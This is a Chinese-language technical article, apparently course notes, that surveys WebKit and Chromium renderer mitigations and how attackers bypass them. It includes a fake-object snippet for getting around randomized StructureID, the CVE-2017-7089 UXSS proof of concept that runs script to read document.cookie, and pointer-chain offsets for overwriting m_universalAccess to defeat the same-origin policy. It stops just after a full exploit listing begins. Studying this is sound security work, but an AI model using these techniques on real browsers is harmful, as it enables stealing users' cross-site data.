---
title: 浏览器缓解措施与渲染器攻击
description: 梳理 WebKit、Chrome 等现代浏览器中的缓解措施，以及渲染器攻击常见利用思路。
date: 2026-05-14 00:25:14 +0800
---

# 浏览器缓解措施与渲染器攻击

# 一、浏览器缓解措施

### 1.1 猫鼠游戏

浏览器安全是一场永不停歇的**猫鼠游戏(Cat and Mouse Game)**：

- **浏览器代码更新极快** — 新技术不断出现，代码库以极快的速度迭代
- **新利用技术不断被创造** — 安全研究者持续发现新的攻击方法和利用原语
- **新缓解措施不断被引入** — 浏览器厂商针对已知的攻击模式部署防御机制

缓解措施的引入动机有两种：

1. **针对流行的利用技术** — 当某种攻击手法变得普遍时，厂商会专门部署针对性缓解
2. **对历史漏洞代码的一般性加固** — 对曾经出过bug的代码区域进行整体强化

**关键认知：缓解措施不是终结者**

- 缓解措施通常只是意味着**更多的工作量**，或者需要**更多的漏洞**来绕过
- 没有任何单一缓解措施能完全阻止攻击，它们只是提高了攻击的门槛
- 攻击者总是能找到绕过方式，只是时间和成本的问题

---

### 1.2 WebKit渲染器缓解措施

WebKit（Safari的渲染引擎）部署了以下 notable 缓解措施：

| 缓解措施 | 目标 |
|----------|------|
| **Isoheaps** | 隔离不同类型对象的堆分配，防止UAF转化为有用原语 |
| **Gigacage** | 内存访问包装器，防止跨堆对象损坏 |
| **随机化StructureID** | 使伪造JSCell对象更困难 |
| **R/W JIT重映射(iOS)** | 使写入JIT代码页面不可能 |
| **指针认证(PAC)** | ARMv8.3-A指针签名，防止控制流劫持 |

---

### 1.3 Isoheaps

**核心思想：** Isoheap为不同对象类型提供**独立的堆**，使DOM对象的UAF(Use-After-Free)更难转化为有用的利用原语。

**实现机制：**

Isoheap通过宏 `WTF_MAKE_ISO_ALLOCATED_IMPL` 实现，该宏展开为 `MAKE_BISO_MALLOCED_IMPL`：

```c++
#define WTF_MAKE_ISO_ALLOCATED_IMPL(name) MAKE_BISO_MALLOCED_IMPL(name)
```

> 源码参考：[/Source/WTF/wtf/IsoMallocInlines.h](https://github.com/WebKit/webkit/blob/3fe3915f3d3cd38f2ddc3b57f24c81cbebfe50be/Source/WTF/wtf/IsoMallocInlines.h#L40)

**覆盖范围：**

几乎**所有WebCore DOM对象**都受Isoheap保护。例如 `HTMLFrameElement`：

```c++
class HTMLFrameElement final : public HTMLFrameElementBase {
    WTF_MAKE_ISO_ALLOCATED(HTMLFrameElement);
    ...
}
```

> 源码参考：[/Source/WebCore/html/HTMLFrameElement.h](https://github.com/WebKit/webkit/blob/3fe3915f3d3cd38f2ddc3b57f24c81cbebfe50be/Source/WebCore/html/HTMLFrameElement.h#L32)

**安全效果：**

- 当一个DOM对象被释放后，其内存只会被**同类型的对象**重新分配
- 攻击者无法通过分配不同类型的对象来"占位"被释放的内存
- 这使得将UAF转化为类型混淆(type confusion)变得更加困难

---

### 1.4 Gigacage

**核心思想：** Gigacage是一种**内存访问包装器**，试图防止对象被用于损坏其他堆中的对象。

**两种Gigacage：**

```c++
enum Kind {
    ...
    Primitive, // Gigacage for backing native memory (array buffers)
    JSValue,   // Gigacage for JSCell objects and Butterflies
};
```

> 源码参考：[/Source/bmalloc/bmalloc/Gigacage.h](https://github.com/WebKit/webkit/blob/3fe3915f3d3cd38f2ddc3b57f24c81cbebfe50be/Source/bmalloc/bmalloc/Gigacage.h#L46)

| Gigacage类型 | 保护内容 |
|-------------|---------|
| **Primitive** | 原生内存的后备存储，如ArrayBuffer的数据 |
| **JSValue** | JSCell对象和Butterflies（JSC数组的属性存储） |

**安全效果：** Gigacage使得**劫持JSArrayBufferView不再可行**——即使攻击者能控制ArrayBufferView的backing store指针，该指针也会被限制在Primitive Gigacage范围内，无法指向任意内存。

---

### 1.5 Gigacage实现

Gigacage提供**两大保护机制**：

#### 1.5.1 堆跑道(Heap Runway)

Gigacage在各个Cage之间分配**大量空内存**（32GB），防止OOB越界到其他堆：

```c++
// This is exactly 32GB because inside JSC, indexed accesses for arrays, typed arrays, etc,
// use unsigned 32-bit ints as indices. The items those indices access are 8 bytes or less
// in size. 2^32 * 8 = 32GB. This means if an access on a caged type happens to go out of
// bounds, the access is guaranteed to land somewhere else in the cage or inside the runway.
// If this were less than 32GB, those OOB accesses could reach outside of the cage.
constexpr size_t gigacageRunway = 32llu * 1024 * 1024 * 1024;
```

> 源码参考：[/Source/bmalloc/bmalloc/Gigacage.cpp](https://github.com/WebKit/webkit/blob/3fe3915f3d3cd38f2ddc3b57f24c81cbebfe50be/Source/bmalloc/bmalloc/Gigacage.cpp#L71)

**为什么是32GB？**

- JSC中数组、TypedArray等的索引访问使用**32位无符号整数**
- 每个元素最大8字节
- `2^32 × 8 = 32GB`
- 即使索引达到最大值，OOB访问也只会落在**同一个cage内**或**runway中**
- 不会越界到其他堆

#### 1.5.2 指针笼化(Pointer Caging)

指针可以通过 `CagedPtr<Gigacage::Kind, T>` 被"笼化"：

```c++
T* get(unsigned size) const {
    ...
    return Gigacage::caged(kind, ptr);
}
```

> 源码参考：[/Source/WTF/wtf/CagedPtr.h](https://github.com/WebKit/webkit/blob/3fe3915f3d3cd38f2ddc3b57f24c81cbebfe50be/Source/WTF/wtf/CagedPtr.h#L51)

当指针被使用时，**必须通过** `Gigacage::caged` 函数进行解引用。`Gigacage::caged` 的实现强制将指针约束在cage范围内：

```c++
template<typename T>
BINLINE T* caged(Kind kind, T* ptr) {
    void* gigacageBasePtr = basePtr(kind);
    // Force pointer into range of cage
    return reinterpret_cast<T*>(
        reinterpret_cast<uintptr_t>(gigacageBasePtr) + (
            reinterpret_cast<uintptr_t>(ptr) & mask(kind)));
}
```

> 源码参考：[/Source/bmalloc/bmalloc/Gigacage.h](https://github.com/WebKit/webkit/blob/3fe3915f3d3cd38f2ddc3b57f24c81cbebfe50be/Source/bmalloc/bmalloc/Gigacage.h#L190)

**工作原理：**

1. 获取指定kind的Gigacage基地址 `gigacageBasePtr`
2. 用 `mask(kind)` 对指针进行掩码操作，只保留cage内的偏移部分
3. 将偏移加到基地址上，**强制指针落入cage范围内**

**JSArrayBufferView的backing store被caged：**

```c++
class JSArrayBufferView : public JSNonFinalObject {
    using VectorPtr = CagedBarrierPtr<Gigacage::Primitive, void, tagCagedPtr>;
    ...
    VectorPtr m_vector;
    uint32_t m_length;
    TypedArrayMode m_mode;
}
```

> 源码参考：[/Source/JavaScriptCore/runtime/JSArrayBufferView.h](https://github.com/WebKit/webkit/blob/3fe3915f3d3cd38f2ddc3b57f24c81cbebfe50be/Source/JavaScriptCore/runtime/JSArrayBufferView.h#L100)

这意味着 `m_vector` 只能指向 **Primitive Gigacage** 内的地址。即使攻击者覆写了 `m_vector`，解引用时也会被强制拉回Primitive Gigacage范围内。

---

### 1.6 Gigacage绕过

#### 1.6.1 WASM Memory绕过

**思路：** 寻找其他**未被caged**的指针。

WASM的 `Memory` 类的 `m_memory` 字段使用的是 `TaggedArrayStoragePtr` 而非 `CagedPtr`：

```c++
class Memory : public RefCounted<Memory> {

    TaggedArrayStoragePtr<void> m_memory;
    size_t m_size { 0 };
    PageCount m_initial;
    PageCount m_maximum;
    ...
}
```

> 源码参考：[Source/JavaScriptCore/wasm/WasmMemory.h](https://github.com/WebKit/webkit/blob/2bd098f9b209dd5c23671aa416474d5690af4754/Source/JavaScriptCore/wasm/WasmMemory.h#L100)

**利用方式：**

- 可以创建一个WASM Memory对象，使其 `m_memory` 指向**任意指针**
- 然后在WASM中读写该指针指向的内存
- 这完全绕过了Gigacage的限制

**修复：** 2019年5月16日，WebKit将 `TaggedArrayStoragePtr` 改为 `CagedMemory`：

```diff
@@ -97,7 +97,8 @@ class Memory : public RefCounted<Memory> {
    Memory(void* memory, PageCount initial, PageCount maximum, size_t mappedCapacity...
    Memory(PageCount initial, PageCount maximum, WTF::Function<void(NotifyPressure)>...

-   TaggedArrayStoragePtr<void> m_memory;
+   using CagedMemory = CagedPtr<Gigacage::Primitive, void, tagCagedPtr>;
+   CagedMemory m_memory;
    size_t m_size { 0 };
    PageCount m_initial;
    PageCount m_maximum;
```

> 修复提交：[WebKit commit 385d20a0](https://github.com/WebKit/webkit/commit/385d20a0e36c9a7db638b26273ddc9c92b573cdc#diff-f751db5d3640969ae224c602ca5eba3f)

#### 1.6.2 Butterfly绕过

**思路：** 使用损坏的butterfly指针来读写内存。Butterfly不受Gigacage保护。

**限制条件：**

- **withDoubles索引类型读取元素** — 受 `publicLength` 限制，不能越界读取
- **命名属性读写JSValues** — 受有效JSValue限制，只能读写合法的JSValue编码值

**利用策略：**

1. 使用损坏的butterfly指针进行受限的内存读写
2. 利用这个受限的读写能力来**禁用Gigacage**
3. 禁用Gigacage后，就可以再次使用ArrayBuffer进行任意读写

**真实案例：** Niklas B使用此技术在[iOS 11.3.1越狱](https://github.com/phoenhex/files/blob/master/exploits/ios-11.3.1/pwn_i8.js#L147)中绕过了Gigacage。

---

### 1.7 JSC Structure ID

JSC中每个JSCell对象的头部包含一个**StructureID**，用于查找该对象的Structure信息：

```c++
typedef uint32_t StructureID;

class StructureIDTable {
    UniqueArray<StructureOrOffset> m_table;
}

inline Structure* StructureIDTable::get(StructureID structureID)
{
    ASSERT_WITH_SECURITY_IMPLICATION(structureID);
    ASSERT_WITH_SECURITY_IMPLICATION(!isNuked(structureID));
    ASSERT_WITH_SECURITY_IMPLICATION(structureID < m_capacity);
    return table()[structureID].structure;
}
```

> 源码参考：[/Source/JavaScriptCore/runtime/StructureIDTable.h](https://github.com/WebKit/webkit/blob/9a8d9fa4ef5069c8afe70c514a81a99950821329/Source/JavaScriptCore/runtime/StructureIDTable.h#L85)

**StructureIDTable** 包含指向 `Structure` 对象的指针数组。`StructureID` 是一个 `uint32_t` 索引，通过它可以在表中查找对应的Structure。

**利用价值：** 如果攻击者能**猜测正确的StructureID**，就可以创建有效的假对象。在随机化之前，StructureID是顺序分配的，很容易猜测。

---

### 1.8 随机化Structure ID

WebKit近期添加了[随机化StructureID的缓解措施](https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336aacd1f5cc75abba49cdf)，将StructureID的**底部7位设为随机值**：

```c++
static constexpr uint32_t s_numberOfEntropyBits = 7;

inline Structure* StructureIDTable::get(StructureID structureID)
{
    ...
    uint32_t structureIndex = structureID >> s_numberOfEntropyBits;
    ...
    return decode(table()[structureIndex].encodedStructureBits, structureID);
}
```

> 源码参考：[/Source/JavaScriptCore/runtime/StructureIDTable.h](https://github.com/WebKit/webkit/blob/6f221776f043ce37e2ea9426c552735441bbeea3/Source/JavaScriptCore/runtime/StructureIDTable.h#L170)

**解码过程：**

```c++
static constexpr uint32_t s_numberOfEntropyBits = 7;
static constexpr uint32_t s_entropyBitsShiftForStructurePointer = 57;

ALWAYS_INLINE Structure* StructureIDTable::decode(
    EncodedStructureBits bits, StructureID structureID)
{
    return bitwise_cast<Structure*>(
        bits ^ (static_cast<uintptr_t>(structureID)
            << s_entropyBitsShiftForStructurePointer));
}
```

> 源码参考：[/Source/JavaScriptCore/runtime/StructureIDTable.h](https://github.com/WebKit/webkit/blob/6f221776f043ce37e2ea9426c552735441bbeea3/Source/JavaScriptCore/runtime/StructureIDTable.h#L134)

**StructureID编码格式：**

```
| 1 Nuke Bit | 24 StructureIDTable Bits | 7 entropy bits |
                                        :       XOR      :
                                        | 7 entropy bits | 57 Structure bits |
                                        :        =       :
                                        |        0       | 57 Structure bits |
```

**解码逻辑解析：**

1. `structureIndex = structureID >> 7` — 右移7位去除entropy bits，得到表索引
2. 从表中取出 `encodedStructureBits`
3. 将 `structureID` 左移57位，与 `encodedStructureBits` 进行XOR
4. XOR的7个entropy位与高位对齐后相互抵消，恢复出正确的Structure指针

**分配顺序也随机化：**

```c++
void StructureIDTable::makeFreeListFromRange(uint32_t first, uint32_t last) {
    // Randomize the free list.
    uint32_t size = last - first + 1;
    uint32_t maxIterations = (size * 2) / 3;
    for (uint32_t count = 0; count < maxIterations; ++count) {
        // Move a random pick either to the head or the tail of the free list.
        uint32_t random = m_weakRandom.getUint32();
        ...
    }
    // Cut list in half and swap halves.
    uint32_t cut = first + (m_weakRandom.getUint32() % size);
    uint32_t afterCut = table()[cut].offset;
    ...
}
```

> 源码参考：[/Source/JavaScriptCore/runtime/StructureIDTable.cpp](https://github.com/WebKit/webkit/blob/6f221776f043ce37e2ea9426c552735441bbeea3/Source/JavaScriptCore/runtime/StructureIDTable.cpp#L48)

**安全效果：**

- 需要知道entropy bits才能创建有效的StructureID
- 这使得**在没有JSCell header泄漏的情况下创建假对象变得更加困难**

**绕过需要：**

1. **泄漏真实的JSCell header** — 从真实对象中获取包含正确StructureID的header
2. **找到不使用Structure的路径** — 绕过Structure查找机制

---

### 1.9 绕过随机化Structure ID

有两种核心策略绕过随机化Structure ID：

**策略一：创建没有有效ID的假对象**

构造一个JSCell header，其中不包含有效的StructureID，但通过特定路径绕过Structure查找。

**策略二：找到不使用Structure的路径**

某些操作在执行时不会加载或验证Structure，可以利用这些路径。

**示例代码 — 通过butterfly读取真实JSCell header：**

```javascript
var real_array = [1.1,1.1,1.1];

var container = {
    // JSCell with no structure ID
    jscell: new Int64('0x0108221700000000').JSC_as_JSValue(),
    butterfly: real_array,
}

let simi_fake = obj_at_addr(addr_of(container).add(0x10));

// Read from butterfly (doesn't load structure)
let array_with_doubles_cell = simi_fake[0];

// Fix structure
container.jscell = array_with_doubles_cell;
```

**代码分析：**

1. **创建container对象** — 包含一个无效的jscell和一个指向 `real_array` 的butterfly
2. **构造假对象** — `simi_fake` 指向container偏移0x10处，即butterfly字段
3. **从butterfly读取** — `simi_fake[0]` 从butterfly读取元素，这个操作**不会加载Structure**
4. **获取真实的JSCell** — 读取到的 `array_with_doubles_cell` 是 `real_array` 的真实JSCell header
5. **修复Structure** — 将真实JSCell写回container的jscell字段

这样就在不需要知道随机entropy bits的情况下，获取了一个有效的JSCell header（包含正确的StructureID）。

---

### 1.10 JIT重映射

**目标：** 使写入JIT代码页面**不可能**。

**实现原理：**

JIT页面默认为R/X（可读可执行），只有在需要更新代码时才临时切换为R/W（可读可写）：

```c++
static inline void* performJITMemcpy(void *dst, const void *src, size_t n)
{
...
    os_thread_self_restrict_rwx_to_rw();
    memcpy(dst, src, n);
    os_thread_self_restrict_rwx_to_rx();
    return dst;
...
}
```

**工作流程：**

1. `os_thread_self_restrict_rwx_to_rw()` — 将当前线程的JIT页面权限从R/X切换为R/W
2. `memcpy(dst, src, n)` — 将编译好的JIT代码复制到JIT页面
3. `os_thread_self_restrict_rwx_to_rx()` — 将权限切换回R/X

**对攻击者的影响：**

- 攻击者无法直接写入JIT页面（因为页面是R/X）
- 必须调用 `performJITMemcpy` 才能写入JIT代码
- 调用 `performJITMemcpy` 需要**先实现ROP**
- 在有PAC保护的iPhone上，ROP更加困难

---

### 1.11 指针认证(Pointer Authentication, PAC)

**背景：** 指针认证是ARMv8.3-A新增的安全特性，iPhone XS（A12芯片）及以后的设备实现了该特性。

**核心思想：** 计算指针的签名，将签名存储在指针的高位中。使用指针前验证签名，如果指针被篡改则触发异常。

**关键指令：**

| 指令 | 功能 |
|------|------|
| `PAC*` | 签名指针，将签名写入高位 |
| `AUT*` | 验证指针签名 |
| `BLRA` | 验证指针并分支跳转（原子操作） |
| `RETA` | 验证指针并返回（原子操作） |

**原子指令的重要性：** `BLRA` 和 `RETA` 在单条指令中完成验证和使用，防止了TOCTOU（Time-of-Check-Time-of-Use）竞争条件。

**安全效果：** 更难劫持控制流——攻击者需要有效的已签名指针。

**绕过方式：**

1. **伪造gadget签名指针** — 找到代码中的"PAC签名gadget"，利用它来签名攻击者控制的指针
2. **交换已签名指针** — 将一个已签名的指针替换为另一个已签名的指针（例如将函数指针替换为system函数的已签名指针）
3. **数据攻击** — 不劫持代码执行，而是利用任意读写进行数据攻击

> **讲师观点：** 数据攻击是未来的方向（"Where I think things are going"）

---

### 1.12 数据攻击

**核心思想：** 不劫持代码执行，而是利用**任意读写**能力直接操作数据来达成攻击目标。

**数据攻击的应用场景：**

| 攻击目标 | 方法 |
|---------|------|
| **损坏JIT编译器结构** | 修改JIT编译器的内部数据结构，使其发射错误的跳转指令 |
| **覆写IPC数据** | 修改进程间通信数据，实现沙箱逃逸 |
| **读写iframe** | 直接读写iframe的数据，窃取web数据 + 实现UXSS |

**数据攻击的优势：**

- 不需要绕过PAC、JIT重映射等代码执行防护
- 只需要任意读写原语
- 更隐蔽，更难检测

---

### 1.13 Chromium渲染器缓解措施

Chromium（Chrome的渲染引擎）部署了以下 notable 缓解措施：

| 缓解措施 | 目标 |
|----------|------|
| **Partition Alloc** | 不同对象类型/大小/生命周期使用独立分区 |
| **W^X JIT** | JIT页面不同时可写和可执行 |
| **Site Isolation** | 不同源在不同渲染器进程中 |

---

### 1.14 Partition Alloc

**核心思想：** 为不同对象类型、大小或生命周期使用**独立的分区(Partition)**，防止跨类型堆溢出。

```c++
// See Allocator.md for a description of these partitions.
static base::PartitionAllocatorGeneric* fast_malloc_allocator_;
static base::PartitionAllocatorGeneric* array_buffer_allocator_;
static base::PartitionAllocatorGeneric* buffer_allocator_;
static base::SizeSpecificPartitionAllocator<1024>* layout_allocator_;
```

> 源码参考：[/third_party/blink/renderer/platform/wtf/allocator/partitions.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/allocator/partitions.h?l=139&rcl=13f6824c517d4a22a73bc9a368f70ada243a6926)

**各分区职责：**

| 分配器 | 用途 |
|--------|------|
| `layout_allocator_` | LayoutObjects，按大小分离 |
| `buffer_allocator_` | Vectors, Strings等 |
| `array_buffer_allocator_` | ArrayBuffer后备内存 |
| `fast_malloc_allocator_` | 所有其他对象 |

**安全效果：** 与Isoheap类似，不同类型的对象在不同分区中分配，使得堆溢出或UAF更难跨类型利用。

---

### 1.15 W^X JIT

**核心思想：** JIT页面标记为RW，写入代码后改为RX，**永远不同时可写和可执行**。

```c++
CodeSpaceMemoryModificationScope::CodeSpaceMemoryModificationScope(Heap* heap)
    : heap_(heap) {
  if (FLAG_write_protect_code_memory) {
    heap_->code_space()->SetReadAndWritable();
  }
}

CodeSpaceMemoryModificationScope::~CodeSpaceMemoryModificationScope() {
  if (FLAG_write_protect_code_memory) {
    heap_->code_space()->SetReadAndExecutable();
  }
}
```

**工作原理：**

- `CodeSpaceMemoryModificationScope` 构造函数将JIT代码空间设为**可读可写(RW)**
- 析构函数将JIT代码空间设为**可读可执行(RX)**
- 利用RAII模式确保权限切换的原子性

**控制选项：** 可以通过 `--[no-]write-protect-code-memory` 命令行标志控制是否启用此保护。

---

### 1.16 W^X JIT绕过

#### 1.16.1 WASM JIT页面绕过

**问题：** WASM的JIT页面**默认不受W^X保护**。

```javascript
let mem = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
var mod = new WebAssembly.Module(mem);
```

使用 `vmmap` 可以看到WASM JIT页面是 **rwxp**（可读可写可执行）：

```plain
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0x155d99b1000      0x155d99b2000 rwxp     1000 0
     0x155d99b2000      0x156199b1000 ---p 3ffff000 0
     0x792b6b84000      0x792b6b8c000 rw-p     8000 0
     0xb03567a7000      0xb03567c0000 ---p    19000 0
     0xb03567c0000      0xb03567c1000 rw-p     1000 0
     0xb03567c1000      0xb03567c2000 ---p     1000 0
     0xb03567c2000      0xb03567e7000 r-xp    25000 0
```

第一行 `rwxp` 页面就是WASM JIT代码区域，攻击者可以直接写入shellcode。

**修复：** 可通过 `--wasm-write-protect-code-memory` 标志启用WASM的W^X保护，未来可能默认启用。

#### 1.16.2 其他绕过方法

| 方法 | 描述 |
|------|------|
| **JIT走私(Smuggling)** | 利用JIT编译器自身的代码生成机制，将payload注入到RX页面中 |
| **竞争窗口** | 竞争RW到RX之间的短暂窗口，在页面仍为RW时写入shellcode |
| **数据攻击JIT编译器** | 修改JIT编译器的内部数据结构，强制其生成攻击者想要的代码 |
| **直接ROP** | 放弃写入shellcode，直接使用ROP链 |

---

## 二、渲染器攻击

### 2.1 欢迎来到沙箱

当攻击者获得了任意代码执行后，代码运行在**渲染器进程**中，而渲染器进程是**被沙箱化**的。

**关键问题：** 在沙箱化的渲染器进程内，我们能做什么？

**渲染器权限：**

| 权限 | 描述 |
|------|------|
| **控制页面渲染** | 可以控制页面上渲染的内容 |
| **通过IPC与浏览器通信** | 可以与浏览器主进程进行进程间通信 |
| **控制iframe和HTTP请求** | 可以控制iframe的加载和HTTP请求的发送 |

其中，**控制iframe和HTTP请求**是最有价值的攻击面。

---

### 2.2 同源策略(Same Origin Policy, SOP)

**核心规则：** SOP规定一个**源(origin)**只能读取和交互自身。

**源的定义：** 一个源基本上是一个**域名及其下所有页面**。两个URL的协议、主机和端口都相同时，才属于同一个源。

**跨源交互受限：**

- 不能读取跨源请求的响应内容
- 不能访问跨源页面的DOM
- 不能发送跨源的AJAX请求（除非目标允许）

**CORS(Cross Origin Resource Sharing)：** 允许站点授予其他源绕过SOP的权限，通过 `Access-Control-Allow-Origin` 等HTTP头实现。

**SOP的安全意义：** 防止恶意站点读取其他站点的内容或伪造请求。

**示例 — SOP阻止跨源请求：**

```javascript
> location.href
"http://www.example.com/"

> fetch('https://mail.google.com/mail/u/0/#inbox', {credentials:'include'})
Access to fetch at 'https://mail.google.com/mail/u/0/#inbox' from origin 'http://www.example.com' has been
blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

> **重要前提：** 以上所有安全保证都假设浏览器没有bug且未被攻破。

---

### 2.3 SOP绕过

SOP绕过通常包括以下几种攻击：

| 攻击类型 | 描述 |
|---------|------|
| **读取其他源的数据** | 获取跨源页面的内容 |
| **伪造请求** | 以用户身份向其他源发送请求 |
| **在其他源上运行代码** | 在跨源页面上执行JavaScript |

**UXSS(Universal Cross Site Scripting)：** 如果攻击者能通过浏览器漏洞在其他源上运行JavaScript，这种漏洞称为UXSS。

UXSS bug可以**独立于内存损坏**存在。例如CVE-2017-7089 Safari UXSS：

```javascript
// CVE-2017-7089 Safari UXSS
function trigger(){
    let parent = open('parent-tab://google.com','_top');
    // Inject HTML to run javascript
    parent.document.body.innerHTML='<img/src=""onerror="alert(document.cookie)">'
}
setTimeout(trigger,100)
```

**代码分析：**

1. `open('parent-tab://google.com','_top')` — 打开一个指向google.com的新标签页
2. `parent.document.body.innerHTML=...` — 向跨源页面的DOM注入HTML
3. `<img/src=""onerror="alert(document.cookie)">` — 利用img标签的onerror事件执行JavaScript
4. 这段代码在正常情况下应该被SOP阻止，但由于浏览器bug，跨源访问被允许

---

### 2.4 WebKit SOP实现

WebKit使用 **SecurityOrigin** 类来管理SOP：

```c++
class SecurityOrigin : public ThreadSafeRefCounted<SecurityOrigin> {
    // Returns true if this SecurityOrigin can script objects in the given
    // SecurityOrigin. For example, call this function before allowing
    // script from one security origin to read or write objects from
    // another SecurityOrigin.
    WEBCORE_EXPORT bool canAccess(const SecurityOrigin&) const;
}

bool SecurityOrigin::canAccess(const SecurityOrigin& other) const
{
    ...
    if (this == &other)
        return true;
    ...
}
```

> 源码参考：[/Source/WebCore/page/SecurityOrigin.cpp](https://github.com/WebKit/webkit/blob/d2c9a2bf17083194a0e6f5f569a9f3bfed325f46/Source/WebCore/page/SecurityOrigin.cpp#L242)

**关键发现：SOP检查在渲染器中执行！**

```c++
class SecurityOrigin : public ThreadSafeRefCounted<SecurityOrigin> {
    ...
    bool m_universalAccess { false };
    ...
}

bool SecurityOrigin::canAccess(const SecurityOrigin& other) const
{
    if (m_universalAccess)
        return true;
    ...
}
```

**`m_universalAccess` 字段：** 如果 `m_universalAccess` 为 `true`，`canAccess()` 直接返回 `true`，绕过所有SOP检查。

**攻击思路：** 如果我们有了渲染器中的任意读写能力，只需**覆写 `m_universalAccess` 为 `true`**，就能完全绕过SOP！

---

### 2.5 定位m_universalAccess

要从渲染器中找到 `m_universalAccess`，需要追踪一条指针链。从 `JSXMLHttpRequest` 对象开始：

```c++
// JSXMLHttpRequest = new XMLHttpRequest();    (this is an IDL bound class)
// XMLHttpRequest = *(JSXMLHttpRequest + 0x18) - 0x30
class XMLHttpRequest final : public ActiveDOMObject {}
class ActiveDOMObject : public ContextDestructionObserver {}
class ContextDestructionObserver {
    ScriptExecutionContext* m_scriptExecutionContext; // +8
}

// ScriptExecutionContext = *(XMLHttpRequest + 8)
class ScriptExecutionContext : public SecurityContext {}
class SecurityContext {
    RefPtr<SecurityOriginPolicy> m_securityOriginPolicy; // +8
}

// SecurityOriginPolicy = *(ScriptExecutionContext+8)
class SecurityOriginPolicy : public RefCounted<SecurityOriginPolicy> {
    Ref<SecurityOrigin> m_securityOrigin; // +8
}

// SecurityOrigin = *(SecurityOriginPolicy+8)
class SecurityOrigin : public ThreadSafeRefCounted<SecurityOrigin> {
    ...
    bool m_universalAccess; // +0x31
    ...
}
// &SecurityOrigin->m_universalAccess = SecurityOrigin+0x31
```

**完整指针链追踪过程：**

```
JSXMLHttpRequest (JS包装对象)
    │
    │ +0x18 解引用, -0x30 偏移调整
    ▼
XMLHttpRequest (C++原生对象)
    │
    │ +0x8 解引用
    ▼
ScriptExecutionContext (脚本执行上下文)
    │
    │ +0x8 解引用
    ▼
SecurityOriginPolicy (安全源策略)
    │
    │ +0x8 解引用
    ▼
SecurityOrigin (安全源)
    │
    │ +0x31 偏移
    ▼
m_universalAccess (bool, 1字节)
```

**关键偏移说明：**

- `JSXMLHttpRequest + 0x18`：JS包装对象中指向原生对象的指针（需要减去0x30的tag偏移）
- `XMLHttpRequest + 0x8`：继承自 `ContextDestructionObserver` 的 `m_scriptExecutionContext` 字段
- `ScriptExecutionContext + 0x8`：继承自 `SecurityContext` 的 `m_securityOriginPolicy` 字段
- `SecurityOriginPolicy + 0x8`：`m_securityOrigin` 字段
- `SecurityOrigin + 0x31`：`m_universalAccess` 布尔字段

---

### 2.6 SOP绕过练习

**练习环境：** 在 `~/webkit/primitives` 的MiniBrowser中运行

**步骤一：尝试访问SOP保护资源（会失败）**

```javascript
try {
    var JSXMLHttpRequest = new XMLHttpRequest();
    JSXMLHttpRequest.open('GET', 'http://example.com', false);
    JSXMLHttpRequest.send()
} catch (e) { console.log(e) }
```

**步骤二：使用任意读写定位m_universalAccess**

1. 创建 `new XMLHttpRequest()` 获取JSXMLHttpRequest对象
2. 使用 `addr_of` 获取JSXMLHttpRequest的地址
3. 沿指针链逐级解引用，找到SecurityOrigin
4. 读取 `SecurityOrigin + 0x31` 处的值

**步骤三：修改m_universalAccess为true**

将 `SecurityOrigin + 0x31` 处的最低位设置为1

**步骤四：再次请求跨源资源（成功！）**

**关键洞察：不需要代码执行，只需要任意读写！**

---

### 2.7 Chromium SOP与Site Isolation

**历史：** Chromium以前也在渲染器中强制执行SOP，与WebKit类似。

**现状：** Chromium现在启用了 **Site Isolation**，提供了更强的隔离保证。

---

### 2.8 Site Isolation

#### 2.8.1 问题：iframe在攻击者的渲染器中

**正常情况：** 浏览器为每个标签页生成一个渲染器进程。

```
┌─────────────────────────────────────────┐
│           Renderer Process 1            │
│                                         │
│   ┌─────────────────────────────────┐   │
│   │     attacker.com (Tab 1)        │   │
│   │                                 │   │
│   │  ┌──────────────────────────┐   │   │
│   │  │  google.com (iframe)     │   │   │
│   │  │  ← 在同一渲染器进程中！   │   │   │
│   │  └──────────────────────────┘   │   │
│   └─────────────────────────────────┘   │
└─────────────────────────────────────────┘
```

如果攻击者加载了一个指向 `google.com` 的iframe，该iframe会被放入攻击者的渲染器进程。攻击者的渲染器可以**直接读写iframe的数据**。

#### 2.8.2 解决方案：Site Isolation

**Site Isolation强制每个源在独立的渲染器进程中运行：**

```
┌──────────────────────┐    ┌──────────────────────┐
│  Renderer Process 1  │    │  Renderer Process 2  │
│                      │    │                      │
│  attacker.com        │    │  google.com          │
│  (Tab 1)             │    │  (iframe)            │
│                      │    │                      │
└──────────────────────┘    └──────────────────────┘
         │                            │
         │         IPC only           │
         └────────────────────────────┘
```

- 攻击者的渲染器与 `google.com` 的渲染器在不同的进程中
- 唯一的交互方式是**IPC**
- Chrome的IPC可以以更强的方式限制进程间的访问

#### 2.8.3 Site Isolation的当前状态

```
There is additional work underway to let Site Isolation offer protection against
even more severe security bugs, where a malicious web page gains complete control
over its process (also known as "arbitrary code execution").  These protections
are not yet fully in place.

We are investigating options for enabling Site Isolation on Android as well.
```

> 参考：[chromium.org/site-isolation](https://www.chromium.org/Home/chromium-security/site-isolation#TOC-Current-Status)

**局限性：**

- 尚未**完全实现**——对"任意代码执行"级别的攻击保护尚未完全到位
- 未在**所有目标**上启用——Android上尚未启用

---

### 2.9 利用Site Isolation

Site Isolation的一个**副作用**是每个源获得独立的进程。这个特性反而可以被攻击者利用：

**每个域名会生成独立的进程：**

```
site_a.com  →  Process A
site_b.com  →  Process B
site_c.com  →  Process C
site_d.com  →  Process D
site_e.com  →  Process E
```

**攻击者可以利用此特性：**

1. **获得更可靠的初始堆状态** — 每个进程有独立的堆，状态更可预测
2. **暴力破解而不崩溃标签页** — 如果利用失败导致进程崩溃，只影响该源的进程，不会崩溃整个标签页

---

### 2.10 SOP绕过的利用

一旦绕过了SOP，攻击者可以：

| 利用方式 | 描述 |
|---------|------|
| **读取和伪造请求** | 读取用户已登录站点的数据，以用户身份发送请求 |
| **安装半持久service worker** | 在其他站点上安装service worker，实现持久化 |
| **滥用web store** | 强制用户安装应用 |

**真实案例：** Pwn2Own 2016中，攻击者利用UXSS强制Play Store安装应用。

---

## 三、完整SOP绕过利用代码

### 3.1 jsc_sop_bypass.html.txt 完整代码分析

这是完整的SOP绕过解决方案，包含创建假Uint32Array实现任意读写、指针链追踪、修改m_universalAccess的完整过程。

**完整源码：**

```html
<pre id="out"></pre>
<script src="./int64.js"></script>
<script>

let print = (x) => {
